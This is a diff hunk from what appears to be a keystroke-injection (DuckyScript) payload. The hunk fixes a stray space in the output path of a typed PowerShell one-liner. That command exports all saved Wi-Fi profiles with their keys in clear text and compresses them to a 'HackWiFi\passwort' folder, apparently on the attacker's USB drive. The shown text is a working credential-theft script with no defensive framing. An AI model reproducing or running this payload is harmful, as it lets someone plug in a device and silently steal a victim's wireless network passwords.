@@ -24,7 +24,7 @@ ENTER
 
 DELAY 7000 
 
-STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\Wifi WPA2 SSIDs ' + $folderDateTime;$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;netsh wlan export profile key=clear folder=$fileSaveDir;Compress-Archive -Path $fileSaveDir -DestinationPath Q:\HackWiFi\passwort\ $((Get-Date).ToString('dd.MM.yyyy-HH-mm-ss')).zip   
+STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\Wifi WPA2 SSIDs ' + $folderDateTime;$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;netsh wlan export profile key=clear folder=$fileSaveDir;Compress-Archive -Path $fileSaveDir -DestinationPath Q:\HackWiFi\passwort\$((Get-Date).ToString('dd.MM.yyyy-HH-mm-ss')).zip   
 
 DELAY 2000 
 
